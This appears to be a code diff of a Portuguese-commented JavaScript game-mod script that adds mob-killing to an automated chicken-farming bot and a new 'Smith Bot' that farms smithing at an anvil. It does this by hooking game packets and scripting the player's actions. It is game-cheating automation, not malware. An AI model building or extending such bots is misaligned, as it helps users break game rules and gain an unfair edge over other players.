+        xMovingNow = false;
+        xDoMove(newBest.x, newBest.y);
+      }
+    }
+    await xDelay(300);
+  }
+
+  // Deseleciona
+  target.id = me;
+  send({ type: 't', t: me });
+  await xDelay(300);
+  
+  // Entra 1 tile para pegar loot + pena se já caiu
+  const lootX = st.itemDir === 1 ? cx + 2 : cx - 2;
+  const lootY = st.itemY;
+  xMovingNow = false;
+  await xDoMove(lootX, lootY);
+  await xDelay(600);
+
+  // Pega loot + pena se já caiu
+  await xDoPickUp();
+  await xDelay(300);
+  await xDoPickUp();
+  await xDelay(300);
+  await xDoPickUp();
+  await xDelay(300);
+  await xDoPickUp();
+  await xDelay(300);
+  await xDoPickUp();
+  await xDelay(300);
+  // Vira para a porta (saída)
+  const dirSaida = st.itemDir === 1 ? 3 : 1;
+  await xDoChangeDir(dirSaida);
+  await xDelay(400);
+
+  // Abre a porta e sai
+  const gateSaida = objects.items.find(el =>
+    el?.name === 'Personal Gate' && el.x === gateX && el.y === st.itemY
+  );
+  if (gateSaida) {
+    await xDoKeyPress(6, 180);
+    await xDelay(1500);
+  }
+
+  // Volta ao corredor
+  xMovingNow = false;
+  await xDoMove(cx, st.itemY);
+  await xDelay(600);
+
+  // Reequipa ferramenta
+  if (inv[st.toolSlot]?.equip === 0) {
+    await xDoUseSlot(st.toolSlot);
+    await xDelay(500);
+  }
+
+  dsk.localMsg('Gal: mob eliminado! Continuando ciclo...', '#5f5');
 }
 
 // ── Loop principal ────────────────────────────────────────────
@@ -19351,7 +19635,6 @@ async function GalBot() {
       xGoing[119]      = false;
       xGoing._galTime  = undefined;
       xMovingNow       = false;
-      // Reset completo do estado para evitar loop em fase corrompida
       const st2 = dsk.gal;
       st2.pegando      = 0;
       st2.itemX        = undefined;
@@ -19372,7 +19655,7 @@ async function GalBot() {
   const cx = st.corredorX;
   const cy = st.corredorY;
 
-  // ── Aguarda resposta do servidor sobre food ────────────────
+  // Aguarda resposta do servidor sobre food
   if (st.waitingInfo || st.checandoFood) {
     xGoing[119] = false;
     return;
@@ -19386,8 +19669,6 @@ async function GalBot() {
       xGoing[119] = false;
       return;
     }
-    // Chegou ao corredor — checa se tem galinha no tile da porta do quarto que acabou de visitar
-    // A porta fica sempre em cx+1 ou cx-1, no mesmo y do item (st.itemY)
     const portaX = st.itemDir === 1 ? cx + 1 : cx - 1;
     const chickenNaPorta = st.itemY !== undefined && mobs && mobs.items &&
       Object.values(mobs.items).find(mob =>
@@ -19396,9 +19677,7 @@ async function GalBot() {
         mob.y === st.itemY
       );
     if (chickenNaPorta) {
-      // Inicia timeout de espera pela galinha sair
       if (!st._chickenWaitStart) st._chickenWaitStart = Date.now();
-      // Se a galinha não saiu em 10s, ignora e prossegue
       if (Date.now() - st._chickenWaitStart < 10000) {
         xGoing[119] = false;
         return;
@@ -19423,21 +19702,21 @@ async function GalBot() {
     const gateSaida  = objects.items.find(el =>
       el?.name === 'Personal Gate' && el.x === gateXSaida && el.y === st.itemY
     );
-	await xDelay(300);
-    _galFecharInfo(); // fecha painel da galinha antes de voltar
-	await xDelay(300);
+    await xDelay(300);
+    _galFecharInfo();
+    await xDelay(300);
     await xDoChangeDir(dirSaida);
     await xDelay(300);
     if (gateSaida) {
       await xDoKeyPress(6, 180);
-      await xDelay(1500); // 1500ms: espera porta fechar antes de voltar ao corredor
+      await xDelay(1500);
     }
     st.pegando = 6;
     xGoing[119] = false;
     return;
   }
 
-  // ── FASE 4: verificando food (no tile do item, ao lado da galinha) ──
+  // ── FASE 4: verificando food ──────────────────────────────
   if (st.pegando === 4) {
     st.checandoFood = true;
     _galCheckFood();
@@ -19453,42 +19732,50 @@ async function GalBot() {
       await xDelay(300);
       st.pegando = 4;
     } else {
-      // Inicia timeout de movimento para evitar loop infinito
       if (!st._moveStart) st._moveStart = Date.now();
       if (Date.now() - st._moveStart > 15000) {
-        // Não chegou no item em 15s — reseta estado completamente
         dsk.localMsg('Gal Bot: não conseguiu chegar ao item, resetando...', '#fa0');
-        st.pegando   = 0;
-        st.itemX     = undefined;
-        st.itemY     = undefined;
-        st.itemDir   = undefined;
+        st.pegando    = 0;
+        st.itemX      = undefined;
+        st.itemY      = undefined;
+        st.itemDir    = undefined;
         st._moveStart = undefined;
-        xMovingNow   = false;
-        xGoing[119]  = false;
+        xMovingNow    = false;
+        xGoing[119]   = false;
         return;
       }
-      xMovingNow = false; // libera lock caso esteja preso
+      xMovingNow = false;
       await xDoMove(st.itemX, st.itemY);
       await xDelay(500);
     }
     if (myself.x === st.itemX && myself.y === st.itemY) {
-      st._moveStart = undefined; // chegou, zera o timer
+      st._moveStart = undefined;
     }
     xGoing[119] = false;
     return;
   }
 
-  // ── FASE 2: abrindo porta de entrada e andando até o item ─
+  // ── FASE 2: checando mob + abrindo porta de entrada ───────
   if (st.pegando === 2) {
+
+    // Checa mob bloqueando ANTES de abrir a porta
+    const blockingMob = _galGetBlockingMob();
+    if (blockingMob) {
+      xGoing[119] = false;
+      await _galKillBlockingMob(blockingMob);
+      // Não reseta pegando — volta para fase 2 para checar de novo
+      // e se não tiver mais mob entra normalmente
+      return;
+    }
+
     const gateXEntrada = st.itemDir === 1 ? cx + 1 : cx - 1;
     const gateEntrada  = objects.items.find(el =>
       el?.name === 'Personal Gate' && el.x === gateXEntrada && el.y === st.itemY
     );
-    // Garante que virou antes de tentar abrir a porta
+
     if (myself.dir !== st.itemDir) {
       if (!st._dirRetry) st._dirRetry = 0;
       st._dirRetry++;
-      // Após 5 tentativas sem virar (≈2s), desiste e reseta o estado
       if (st._dirRetry > 5) {
         dsk.localMsg('Gal Bot: falha ao virar, resetando...', '#fa0');
         st.pegando    = 0;
@@ -19500,14 +19787,15 @@ async function GalBot() {
         xGoing[119]   = false;
         return;
       }
-      xMovingNow = false; // libera lock caso esteja preso
-	  await xDelay(400);
+      xMovingNow = false;
+      await xDelay(400);
       await xDoChangeDir(st.itemDir);
       await xDelay(400);
       xGoing[119] = false;
       return;
     }
-    st._dirRetry = 0; // virou com sucesso, zera o contador
+    st._dirRetry = 0;
+
     if (gateEntrada) {
       await xDoKeyPress(6, 180);
       await xDelay(500);
@@ -19538,8 +19826,23 @@ async function GalBot() {
     return;
   }
 
-  // ── FASE 0: procurando item ───────────────────────────────
+  // ── FASE 0: procurando item / checando mobs ───────────────
   if (st.pegando === 0) {
+
+    // Checa mob em qualquer quarto mesmo sem pena no chão
+    const anyMob = _galGetAnyBlockingMob();
+    if (anyMob) {
+      st.itemY   = anyMob.y;
+      st.itemDir = anyMob.x > cx ? 1 : 3;
+      xGoing[119] = false;
+      await _galKillBlockingMob(anyMob);
+      // Reseta itemY e itemDir — volta a procurar pena normalmente
+      st.itemY   = undefined;
+      st.itemDir = undefined;
+      return;
+    }
+
+    // Procura pena/ovo no chão
     const item = _galFindItem();
     if (item) {
       st.itemX   = item.x;
@@ -19628,16 +19931,15 @@ dsk.setCmd('/gal', () => {
   dsk.galManager = gc;
 
   const FASES = [
-    '🔍 Procurando item',
+    '🔍 Procurando item / mobs',
     '🚶 Indo até o item',
-    '🚪 Abrindo entrada',
+    '🚪 Checando mob + entrada',
     '🪶🥚 Pegando item',
     '🍗 Verificando food',
     '🚪 Abrindo saída',
     '🏠 Voltando corredor',
   ];
 
-  // Atualiza botão play e labels em tempo real
   { let _t = 0; dsk.on('postLoop', () => {
     if (!gcPanel || ++_t % 10 !== 0) return;
 
@@ -19670,6 +19972,14 @@ dsk.setCmd('/gal', () => {
         ? 'Dropa 1 worm se food < 12%'
         : 'Dropa 2 worms se ≤50%  |  1 worm se ≤70%';
     }
+
+    const yRadEl = gcPanel.querySelector('[data-gc="yradval"]');
+    if (yRadEl) yRadEl.textContent = `±${dsk.gal.yRadius ?? 15} tiles`;
+
+    const mobSlotEl  = gcPanel.querySelector('[data-gc="mobslotval"]');
+    const toolSlotEl = gcPanel.querySelector('[data-gc="toolslotval"]');
+    if (mobSlotEl)  mobSlotEl.textContent  = `Slot ${(dsk.gal.mobSlot  ?? 2) + 1}`;
+    if (toolSlotEl) toolSlotEl.textContent = `Slot ${(dsk.gal.toolSlot ?? 1) + 1}`;
   }); }
 
   function removePanel() {
@@ -19683,7 +19993,7 @@ dsk.setCmd('/gal', () => {
     Object.assign(gcPanel.style, {
       position: 'fixed', top: '60px', left: '50%',
       transform: 'translateX(-50%)',
-      width: '250px',
+      width: '260px',
       background: '#1e1e2e', border: '1px solid #555',
       borderRadius: '10px', boxShadow: '0 8px 24px rgba(0,0,0,0.7)',
       zIndex: '99997', fontFamily: 'Verdana, sans-serif', userSelect: 'none',
@@ -19742,7 +20052,6 @@ dsk.setCmd('/gal', () => {
     const modoLbl = document.createElement('span');
     modoLbl.textContent = 'Modo de coleta';
     Object.assign(modoLbl.style, { color: '#aaa', fontSize: '11px' });
-
     const modoBtn = document.createElement('button');
     modoBtn.dataset.gc = 'modobtn';
     const isPena0 = dsk.gal.modo === 'pena';
@@ -19786,20 +20095,95 @@ dsk.setCmd('/gal', () => {
       background: '#12121e', borderRadius: '7px', padding: '8px 10px',
       display: 'flex', flexDirection: 'column', gap: '4px',
     });
-
     const posEl = document.createElement('div');
     posEl.dataset.gc = 'pos';
     posEl.textContent = `Corredor: (${dsk.gal.corredorX}, ${dsk.gal.corredorY})`;
     Object.assign(posEl.style, { color: '#FFD700', fontSize: '11px' });
-
     const faseEl = document.createElement('div');
     faseEl.dataset.gc = 'fase';
     faseEl.textContent = `Fase: ${FASES[dsk.gal.pegando] ?? '-'}`;
     Object.assign(faseEl.style, { color: '#aaa', fontSize: '10px' });
-
     statusBox.appendChild(posEl);
     statusBox.appendChild(faseEl);
     body.appendChild(statusBox);
+
+    // ── Raio Y ────────────────────────────────────────────────
+    const yRadRow = document.createElement('div');
+    Object.assign(yRadRow.style, {
+      background: '#2a2a3e', borderRadius: '7px', padding: '7px 10px',
+      display: 'flex', alignItems: 'center', justifyContent: 'space-between',
+    });
+    const yRadLbl = document.createElement('div');
+    const yRadTitle = document.createElement('div');
+    yRadTitle.textContent = 'Raio Y (±tiles do centro)';
+    Object.assign(yRadTitle.style, { color: '#aaa', fontSize: '10px', marginBottom: '2px' });
+    const yRadVal = document.createElement('div');
+    yRadVal.dataset.gc = 'yradval';
+    yRadVal.textContent = `±${dsk.gal.yRadius ?? 15} tiles`;
+    Object.assign(yRadVal.style, { color: '#FFD700', fontSize: '11px', fontWeight: 'bold' });
+    yRadLbl.appendChild(yRadTitle); yRadLbl.appendChild(yRadVal);
+    const yRadBtns = document.createElement('div');
+    Object.assign(yRadBtns.style, { display: 'flex', gap: '4px' });
+    function makeYBtn(txt, fn) {
+      const b = document.createElement('button');
+      b.textContent = txt;
+      Object.assign(b.style, {
+        padding: '3px 8px', borderRadius: '5px', border: '1px solid #555',
+        background: '#1a1a2e', color: '#fff', cursor: 'pointer', fontSize: '12px',
+      });
+      b.onmouseenter = () => b.style.background = '#3a3a5e';
+      b.onmouseleave = () => b.style.background = '#1a1a2e';
+      b.onclick = fn; return b;
+    }
+    yRadBtns.appendChild(makeYBtn('-5', () => {
+      dsk.gal.yRadius = Math.max(1, (dsk.gal.yRadius ?? 15) - 5);
+    }));
+    yRadBtns.appendChild(makeYBtn('+5', () => {
+      dsk.gal.yRadius = (dsk.gal.yRadius ?? 15) + 5;
+    }));
+    yRadRow.appendChild(yRadLbl); yRadRow.appendChild(yRadBtns);
+    body.appendChild(yRadRow);
+
+    // ── Slots arma / ferramenta ───────────────────────────────
+    const slotBox = document.createElement('div');
+    Object.assign(slotBox.style, {
+      background: '#2a2a3e', borderRadius: '7px', padding: '7px 10px',
+      display: 'flex', flexDirection: 'column', gap: '6px',
+    });
+    [
+      { label: '⚔️ Slot Arma',       key: 'mobSlot',  dataKey: 'mobslotval'  },
+      { label: '✂️ Slot Ferramenta', key: 'toolSlot', dataKey: 'toolslotval' },
+    ].forEach(({ label, key, dataKey }) => {
+      const row = document.createElement('div');
+      Object.assign(row.style, { display: 'flex', alignItems: 'center', justifyContent: 'space-between' });
+      const lbl = document.createElement('div');
+      lbl.textContent = label;
+      Object.assign(lbl.style, { color: '#aaa', fontSize: '10px' });
+      const val = document.createElement('span');
+      val.dataset.gc = dataKey;
+      val.textContent = `Slot ${(dsk.gal[key] ?? 0) + 1}`;
+      Object.assign(val.style, { color: '#FFD700', fontSize: '11px', fontWeight: 'bold', minWidth: '45px', textAlign: 'center' });
+      const btns = document.createElement('div');
+      Object.assign(btns.style, { display: 'flex', gap: '4px' });
+      const bMinus = document.createElement('button');
+      bMinus.textContent = '-';
+      const bPlus  = document.createElement('button');
+      bPlus.textContent  = '+';
+      [bMinus, bPlus].forEach(b => {
+        Object.assign(b.style, {
+          width: '22px', height: '22px', borderRadius: '4px', border: '1px solid #555',
+          background: '#1a1a2e', color: '#fff', cursor: 'pointer', fontSize: '13px',
+        });
+        b.onmouseenter = () => b.style.background = '#3a3a5e';
+        b.onmouseleave = () => b.style.background = '#1a1a2e';
+      });
+      bMinus.onclick = () => { dsk.gal[key] = Math.max(0, (dsk.gal[key] ?? 0) - 1); };
+      bPlus.onclick  = () => { dsk.gal[key] = Math.min(14, (dsk.gal[key] ?? 0) + 1); };
+      btns.appendChild(bMinus); btns.appendChild(bPlus);
+      row.appendChild(lbl); row.appendChild(val); row.appendChild(btns);
+      slotBox.appendChild(row);
+    });
+    body.appendChild(slotBox);
 
     // ── Botão capturar posição ────────────────────────────────
     const captureBtn = document.createElement('button');
@@ -19827,7 +20211,6 @@ dsk.setCmd('/gal', () => {
     // ── Botão Play/Stop ───────────────────────────────────────
     const playBtn = document.createElement('button');
     playBtn.dataset.gc = 'playbtn';
-
     function updatePlayBtn() {
       const on = !!dsk.gal?.enabled;
       playBtn.textContent       = on ? '⏹ Stop' : '▶ Play';
@@ -19871,7 +20254,6 @@ dsk.setCmd('/gal', () => {
   window.gc = gc;
 })();
 
-// ── AUTO RESEAR ──────────────────────────────────────────────
 
 // ── MACRO: AutoResear ────────────────────────────────────────
 dsk.resear = {
@@ -19921,6 +20303,7 @@ dsk.setCmd('/resear', () => {
     dsk.localMsg('AutoResear: Desativado', '#f55');
   }
 });
+
 
 // ── FAZ TINTA ────────────────────────────────────────────────
 
@@ -20052,6 +20435,879 @@ dsk.setCmd('/teleport', () => {
   window.teleport();
   dsk.localMsg('Teleport executado!', '#0ff');
 });
+
+
+
+// ══════════════════════════════════════════════════════════════
+// ⚒️  SMITH BOT  ─  by Pablo Mod
+// Farm de smithing no Anvil: bate até 70%, retira item, dropa,
+// recoloca e repete. Repara o martelo automaticamente se quebrar.
+//
+// Setup:
+//   - Slot 0: martelo (bronze_hammer ou similar)
+//   - Slot 1: item a ser upado
+//   - Anvil: já com as gemas inseridas
+//   - Posicione ao lado do Anvil virado para ele
+//   - Digite /smith para iniciar
+// ══════════════════════════════════════════════════════════════
+
+dsk.smith = {
+  enabled:      false,
+  progress:     0,       // progresso atual (0-100)
+  targetPct:    70,      // % para parar de bater
+  anvil:        null,    // { x, y } do Anvil
+  playerPos:    null,    // { x, y } posição original do jogador
+  dirToAnvil:   null,    // direção virada para o Anvil
+  itemName:     null,    // nome do item no slot 1
+  repairing:    false,   // flag de reparo em andamento
+  phase:        'idle',  // fase atual para debug
+};
+
+// ── Captura progresso do notice no pkg ───────────────────────
+dsk.on('postPacket:pkg', packet => {
+  if (!dsk.smith.enabled) return;
+  if (!packet?.data) return;
+  try {
+    const arr = JSON.parse(packet.data);
+    arr.forEach(raw => {
+      const item = JSON.parse(raw);
+      if (item.type !== 'fx' && item.tpl !== 'notice') return;
+      if (item.type === 'fx' && item.tpl === 'notice' && item.d) {
+        const pct = parseInt(item.d);
+        if (!isNaN(pct)) {
+          dsk.smith.progress = pct;
+        }
+      }
+    });
+  } catch(e) {}
+});
+
+// ── Calcula posição do Anvil baseado na direção do jogador ────
+function xSmithGetAnvilPos() {
+  const dir = myself.dir;
+  const offsets = {
+    0: { dx:  0, dy: -1 }, // cima
+    1: { dx:  1, dy:  0 }, // direita
+    2: { dx:  0, dy:  1 }, // baixo
+    3: { dx: -1, dy:  0 }, // esquerda
+  };
+  const off = offsets[dir];
+  return { x: myself.x + off.dx, y: myself.y + off.dy };
+}
+
+// ── Calcula posição oposta ao Anvil (para dropar sem cair nele) ─
+function xSmithGetSafeDropPos() {
+  const dir = dsk.smith.dirToAnvil;
+  // Move para o lado oposto ao Anvil
+  const opposite = (dir + 2) % 4;
+  const offsets = {
+    0: { dx:  0, dy: -1 },
+    1: { dx:  1, dy:  0 },
+    2: { dx:  0, dy:  1 },
+    3: { dx: -1, dy:  0 },
+  };
+  const off = offsets[opposite];
+  return { x: dsk.smith.playerPos.x + off.dx, y: dsk.smith.playerPos.y + off.dy };
+}
+
+// ── Coloca item do slot 1 no Anvil ────────────────────────────
+// Basta estar virado pro Anvil com o item no slot 1 e atacar
+async function xSmithPlaceItem() {
+  dsk.smith.phase = 'placing';
+  await xDoMove(dsk.smith.playerPos.x, dsk.smith.playerPos.y);
+  await xDelay(500);
+  await xDoChangeDir(dsk.smith.dirToAnvil);
+  await xDelay(400);
+  // Dropa o item virado pro Anvil → cai dentro do Anvil
+  await xDoDropSlot(1, 2); // slot 1 do inv = slot 2 no xDoDropSlot
+  await xDelay(600);
+  // Equipa martelo para começar a bater
+  if (inv[0]?.equip === 0) {
+    await xDoUseSlot(0);
+    await xDelay(400);
+  }
+}
+
+// ── Retira item do Anvil → desequipa martelo + ataca ─────────
+async function xSmithRetrieveItem() {
+  dsk.smith.phase = 'retrieving';
+  await xDoMove(dsk.smith.playerPos.x, dsk.smith.playerPos.y);
+  await xDelay(500);
+  await xDoChangeDir(dsk.smith.dirToAnvil);
+  await xDelay(400);
+  // Desequipa martelo (xDoUseSlot no slot em que ele está = slot 0)
+  if (inv[0]?.equip === 1) {
+    await xDoUseSlot(0);
+    await xDelay(400);
+  }
+  // Ataca → item volta pro slot 1
+  await xDoKeyPress(6, 200);
+  await xDelay(800);
+}
+
+// ── Dropa item (reseta contagem) e pega de volta ─────────────
+async function xSmithResetItem() {
+  dsk.smith.phase = 'resetting';
+  // Já está virado pro Anvil → dropa direto, item cai no Anvil
+  await xDoDropSlot(1, 2);
+  await xDelay(600);
+}
+
+// ── Reparo do martelo (slot 0) ────────────────────────────────
+async function xSmithRepairHammer() {
+  dsk.smith.phase   = 'repairing';
+  dsk.smith.repairing = true;
+
+  const kitSlot = xGetSlotByID(719);
+  if (kitSlot === undefined) {
+    dsk.localMsg('Smith: sem Repair Kit no inventário!', '#f55');
+    dsk.smith.enabled   = false;
+    dsk.smith.repairing = false;
+    return;
+  }
+
+  // Guarda posição atual
+  const myX = myself.x;
+  const myY = myself.y;
+
+  // Para de atacar e desequipa tudo
+  await xDoKeyUp(6);
+  await xDelay(400);
+
+  // Vira para lado oposto ao Anvil para dropar o martelo
+  const safeDir = (dsk.smith.dirToAnvil + 2) % 4;
+  await xDoChangeDir(safeDir);
+  await xDelay(400);
+
+  // Dropa o martelo (slot 0 → xDoDropSlot slot 1)
+  await xDoDropSlot(1, 1);
+  await xDelay(500);
+
+  // Equipa repair kit
+  await xDoUseSlotByID(kitSlot);
+  await xDelay(500);
+
+  // Move 1 tile para o lado (perpendicular ao Anvil) para reparar
+  // assim o martelo fica no tile original e consegue reparar de frente
+  const perpDir = (dsk.smith.dirToAnvil + 1) % 4;
+  const perpOff = {
+    0: { dx:  0, dy: -1 },
+    1: { dx:  1, dy:  0 },
+    2: { dx:  0, dy:  1 },
+    3: { dx: -1, dy:  0 },
+  };
+  const pOff = perpOff[perpDir];
+  await xDoMove(myX + pOff.dx, myY + pOff.dy);
+  await xDelay(700);
+
+  // Vira para o tile onde está o martelo (posição original)
+  const dirToHammer = (perpDir + 2) % 4; // oposto ao movimento
+  await xDoChangeDir(dirToHammer);
+  await xDelay(400);
+
+  // Repara até "is in perfect condition"
+  let repaired = false;
+  let attempts = 0;
+  while (!repaired && attempts < 60 && dsk.smith.enabled) {
+    await xDoKeyPress(6, 200);
+    await xDelay(500);
+    if (xIfChatHas('is in perfect condition')) {
+      xDoClearChat('is in perfect condition');
+      repaired = true;
+    }
+    attempts++;
+  }
+
+  await xDelay(400);
+
+  // Volta para a posição original
+  await xDoMove(myX, myY);
+  await xDelay(700);
+
+  // Pega o martelo do chão
+  await xDoPickUp();
+  await xDelay(400);
+  await xDoPickUp(); // double pick
+  await xDelay(400);
+
+  // Reequipa o martelo (slot 0)
+  if (inv[0]?.equip === 0) {
+    await xDoUseSlot(0);
+    await xDelay(400);
+  }
+
+  // Volta a virar pro Anvil
+  await xDoChangeDir(dsk.smith.dirToAnvil);
+  await xDelay(400);
+
+  dsk.smith.repairing = false;
+  dsk.localMsg('Smith: martelo reparado! Continuando...', '#5f5');
+}
+
+// ── Loop principal ────────────────────────────────────────────
+async function xSmith() {
+  if (dskPaused) return;
+  if (!myself || game_state !== 2) return;
+  if (dsk.smith.repairing) return;
+
+  if (xGoing[145] === true) return;
+  xGoing[145] = true;
+
+  // Verifica level alvo
+  if (currentLevel > 0 && skillLevel >= currentLevel && skillName === 'smithing') {
+    await xDoKeyUp(6);
+    xGoing[145] = false;
+    dsk.smith.enabled = false;
+    dsk.smith.phase = 'idle';
+    dsk.localMsg('Smith Bot: level alvo atingido! Desativado.', '#5f5');
+    return;
+  }
+
+  // ── Checa martelo quebrado ANTES de qualquer ação ────────────
+  if (inv[0]?.equip === 2) {
+    xGoing[145] = false;
+    await xSmithRepairHammer();
+    return;
+  }
+
+  // ── Garante que está na posição e virado pro Anvil ────────────
+  if (myself.x !== dsk.smith.playerPos.x || myself.y !== dsk.smith.playerPos.y) {
+    await xDoMove(dsk.smith.playerPos.x, dsk.smith.playerPos.y);
+    await xDelay(600);
+    xGoing[145] = false;
+    return;
+  }
+
+  if (myself.dir !== dsk.smith.dirToAnvil) {
+    await xDoChangeDir(dsk.smith.dirToAnvil);
+    await xDelay(400);
+  }
+
+  // ── Checa se item está no slot 1 ─────────────────────────────
+  const itemInSlot1 = inv[1]?.sprite !== undefined;
+
+  if (itemInSlot1) {
+    // Item no inventário → coloca no Anvil
+    dsk.smith.phase    = 'placing';
+    dsk.smith.progress = 0;
+    xGoing[145] = false;
+    await xSmithPlaceItem();
+    return;
+  }
+
+  // ── Item está no Anvil → bate ─────────────────────────────────
+  if (dsk.smith.progress < dsk.smith.targetPct) {
+    dsk.smith.phase = 'hitting';
+
+    // Equipa martelo se não estiver equipado
+    if (inv[0]?.equip === 0) {
+      await xDoUseSlot(0);
+      await xDelay(400);
+    }
+
+    // Bate uma vez
+    await xDoKeyPress(6, 200);
+    await xDelay(600);
+
+    xGoing[145] = false;
+    return;
+  }
+
+  // ── Atingiu 70% → sequência de reset ─────────────────────────
+  dsk.smith.phase = 'resetting';
+  dsk.localMsg(`Smith: ${dsk.smith.progress}% atingido! Resetando...`, '#ff0');
+
+  // 1. Retira item do Anvil
+  await xSmithRetrieveItem();
+  await xDelay(500);
+
+  // 2. Dropa e pega (reseta contagem)
+  await xSmithResetItem();
+  await xDelay(500);
+
+  dsk.smith.progress = 0;
+  dsk.smith.phase    = 'idle';
+  xGoing[145] = false;
+}
+
+// ── Comando /smith ────────────────────────────────────────────
+dsk.setCmd('/smith', () => {
+  dsk.smith.enabled = !dsk.smith.enabled;
+
+  if (dsk.smith.enabled) {
+    // Valida slot 0 = martelo
+    if (!inv[0]?.sprite) {
+      dsk.localMsg('Smith: coloque o martelo no slot 0!', '#f55');
+      dsk.smith.enabled = false;
+      return;
+    }
+
+    // Captura posição e direção ao iniciar
+    dsk.smith.playerPos   = { x: myself.x, y: myself.y };
+    dsk.smith.dirToAnvil  = myself.dir;
+    dsk.smith.anvil       = xSmithGetAnvilPos();
+    dsk.smith.progress    = 0;
+    dsk.smith.repairing   = false;
+    dsk.smith.phase       = 'idle';
+    xGoing[145]           = false;
+
+    // Captura nome do item se já estiver no slot 1
+    if (inv[1]?.sprite) {
+      dsk.smith.itemName = inv[1].n ?? xGetItemNameBySlot(1) ?? 'item';
+    } else {
+      dsk.smith.itemName = 'item';
+    }
+
+    dsk.localMsg(`Smith Bot: Ativado`, '#5f5');
+    dsk.localMsg(`Smith: Anvil em (${dsk.smith.anvil.x}, ${dsk.smith.anvil.y}) | Dir: ${dsk.smith.dirToAnvil} | Item: ${dsk.smith.itemName}`, '#0ff');
+    dsk.botActive = true;
+
+    (async function loop() {
+      while (dsk.smith.enabled) {
+        await xSmith();
+        await xDelay(300);
+      }
+      dsk.botActive = false;
+    })();
+
+  } else {
+    xGoing[145]         = false;
+    dsk.smith.repairing = false;
+    dsk.smith.phase     = 'idle';
+    dsk.botActive       = false;
+    xDoKeyUp(6);
+    dsk.localMsg('Smith Bot: Desativado', '#f55');
+  }
+});
+
+// ── Config Panel HTML ─────────────────────────────────────────
+(function () {
+  let smPanel = null;
+
+  const smm = {
+    get visible() { return !!smPanel; },
+    set visible(v) { if (!v && smPanel) removePanel(); else if (v && !smPanel) createPanel(); },
+  };
+  dsk.smithManager = smm;
+
+  // Atualiza labels em tempo real
+  { let _t = 0; dsk.on('postLoop', () => {
+    if (!smPanel || ++_t % 6 !== 0) return;
+    const q   = k => smPanel.querySelector(`[data-sm="${k}"]`);
+    const set = (k, v) => { const el = q(k); if (el) el.textContent = v; };
+
+    set('status',   dsk.smith.enabled ? '🟢 Ativo' : '🔴 Pausado');
+    set('phase',    `Fase: ${dsk.smith.phase}`);
+    set('progress', `Progresso: ${dsk.smith.progress}%`);
+    set('skill',    `Skill: ${window.skillName || '-'}`);
+    set('level',    `Level: ${window.skillLevel ?? '-'}`);
+    set('anvil',    dsk.smith.anvil ? `Anvil: (${dsk.smith.anvil.x}, ${dsk.smith.anvil.y})` : 'Anvil: -');
+    set('item',     `Item: ${dsk.smith.itemName || '-'}`);
+    set('hammer',   `Martelo: ${inv[0]?.equip === 2 ? '🔴 QUEBRADO' : inv[0]?.equip === 1 ? '🟢 Equipado' : '⚪ Desequipado'}`);
+
+    // Botão play
+    const btn = smPanel.querySelector('[data-sm="playbtn"]');
+    if (btn) {
+      const on = !!dsk.smith.enabled;
+      btn.textContent       = on ? '⏹ Stop' : '▶ Play';
+      btn.style.background  = on ? '#3a1a1a' : '#1a3a2a';
+      btn.style.borderColor = on ? '#e74c3c' : '#2ecc71';
+      btn.style.color       = on ? '#e74c3c' : '#2ecc71';
+    }
+  }); }
+
+  function removePanel() {
+    if (smPanel) { smPanel.remove(); smPanel = null; }
+  }
+
+  function createPanel() {
+    if (smPanel) { removePanel(); return; }
+
+    smPanel = document.createElement('div');
+    Object.assign(smPanel.style, {
+      position: 'fixed', top: '80px', left: '50%',
+      transform: 'translateX(-50%)',
+      width: '260px',
+      background: '#1e1e2e', border: '1px solid #555',
+      borderRadius: '10px', boxShadow: '0 8px 24px rgba(0,0,0,0.7)',
+      zIndex: '99997', fontFamily: 'Verdana, sans-serif', userSelect: 'none',
+    });
+
+    // Header
+    const header = document.createElement('div');
+    Object.assign(header.style, {
+      display: 'flex', alignItems: 'center', justifyContent: 'space-between',
+      padding: '8px 10px', background: '#2a2a3e',
+      borderRadius: '10px 10px 0 0', cursor: 'move', borderBottom: '1px solid #444',
+    });
+    const title = document.createElement('span');
+    title.textContent = '⚒️ Smith Bot Config';
+    Object.assign(title.style, { color: '#FFD700', fontWeight: 'bold', fontSize: '13px' });
+    const closeBtn = document.createElement('button');
+    closeBtn.textContent = '✕';
+    Object.assign(closeBtn.style, {
+      background: 'none', border: 'none', color: '#aaa',
+      cursor: 'pointer', fontSize: '15px', padding: '0 2px',
+    });
+    closeBtn.onclick = () => removePanel();
+    header.appendChild(title); header.appendChild(closeBtn);
+
+    // Drag
+    let dragging = false, ox = 0, oy = 0;
+    header.addEventListener('mousedown', _startDrag);
+    header.addEventListener('touchstart', _startDrag, { passive: false });
+    function _startDrag(e) {
+      if (e.target === closeBtn) return;
+      e.preventDefault(); dragging = true;
+      const _xy = _getXY(e);
+      ox = _xy.x - smPanel.getBoundingClientRect().left;
+      oy = _xy.y - smPanel.getBoundingClientRect().top;
+      smPanel.style.transform = 'none';
+    }
+    window.addEventListener('mousemove',  _onDragMove);
+    window.addEventListener('touchmove',  _onDragMove, { passive: false });
+    window.addEventListener('mouseup',  _onDragEnd);
+    window.addEventListener('touchend', _onDragEnd);
+    function _onDragMove(e) { if (!dragging) return; const _xy = _getXY(e); smPanel.style.left = (_xy.x - ox) + 'px'; smPanel.style.top = (_xy.y - oy) + 'px'; }
+    function _onDragEnd() { dragging = false; }
+
+    // Body
+    const body = document.createElement('div');
+    Object.assign(body.style, { padding: '10px 12px', display: 'flex', flexDirection: 'column', gap: '6px' });
+
+    // Status box
+    const statusBox = document.createElement('div');
+    Object.assign(statusBox.style, {
+      background: '#12121e', borderRadius: '7px', padding: '8px 10px',
+      display: 'flex', flexDirection: 'column', gap: '3px',
+    });
+    [
+      ['status',   '🔴 Pausado'],
+      ['phase',    'Fase: idle'],
+      ['progress', 'Progresso: 0%'],
+      ['skill',    'Skill: -'],
+      ['level',    'Level: -'],
+      ['anvil',    'Anvil: -'],
+      ['item',     'Item: -'],
+      ['hammer',   'Martelo: -'],
+    ].forEach(([key, initial]) => {
+      const el = document.createElement('div');
+      el.dataset.sm = key;
+      el.textContent = initial;
+      Object.assign(el.style, { color: '#ddd', fontSize: '11px' });
+      statusBox.appendChild(el);
+    });
+    body.appendChild(statusBox);
+
+    // Target % row
+    const targetRow = document.createElement('div');
+    Object.assign(targetRow.style, {
+      background: '#2a2a3e', borderRadius: '7px', padding: '7px 10px',
+      display: 'flex', alignItems: 'center', justifyContent: 'space-between',
+    });
+    const targetLbl = document.createElement('div');
+    const targetTitle = document.createElement('div');
+    targetTitle.textContent = '% para parar';
